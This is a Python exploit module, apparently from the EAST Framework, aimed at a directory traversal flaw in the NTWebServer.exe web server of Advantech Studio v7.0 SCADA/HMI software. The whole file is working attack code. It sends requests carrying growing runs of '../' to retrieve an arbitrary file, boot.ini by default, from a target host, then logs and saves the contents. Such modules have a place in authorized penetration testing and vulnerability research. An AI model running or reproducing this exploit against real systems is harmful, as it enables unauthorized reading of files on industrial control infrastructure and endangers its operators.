#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework or pack for it - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import urllib2

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_advantech_studio_dt"
INFO['DESCRIPTION'] = "Advantech Studio Directory Traversal"
INFO['VENDOR'] = "http://advantech.com.tw"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ''
INFO["CVE Name"] = "?"
INFO["NOTES"] = """
Advantech Studio v7.0 SCADA/HMI has a built in web server NTWebServer.exe,
the web server is a standalone executable that is used along side every project
to serve as a web based management system with the help of an activex.
Directory traversal vulnerability in the NTWebServer.exe, allows remote attackers to read arbitrary files."""

INFO['CHANGELOG'] = "07 Jan, 2013. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1"
OPTIONS["PORT"] = 80
OPTIONS["FILENAME"] = 'boot.ini'

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.ssl = None
        self.filename = None
        self.state = "running"
        return
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.filename = self.args.get('FILENAME', 'boot.ini')
        return
    
    def make_url(self, path = ''):
        return '{}{}:{}{}'.format(self.prot(), self.host, self.port, path)
    
    def prot(self):
        return self.ssl and 'https://' or 'http://'
    
    def makerequest(self, f, count):
        a = ""
        for i in xrange(0, count):
            a = a + "../"
        return a + f
    
    def run(self):
        self.args()
        self.log('Try download file: {}'.format(self.filename))
        
        allData = ""
        for i in xrange(0, 32):
            request = self.make_url('/' + self.makerequest(self.filename, i))
            self.log("sending request = " + request)

            try:
                data = urllib2.urlopen(request)
                allData = data.read()
                #if allData.lower().find("no such file or directory") > -1: continue
                #if allData.lower().find("not exist") > -1: continue
                self.log('Found ' + self.filename)
                self.log("Found file: " + request)
                break
            except:
                self.log('Not found')
        
        if allData:
            self.writefile(allData)
            self.log('===Content of file===')
            self.log(allData)
            self.log('=========End=========')
            
            self.finish(True)
            return 1
        
        self.log('failed')
        self.finish(False)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
    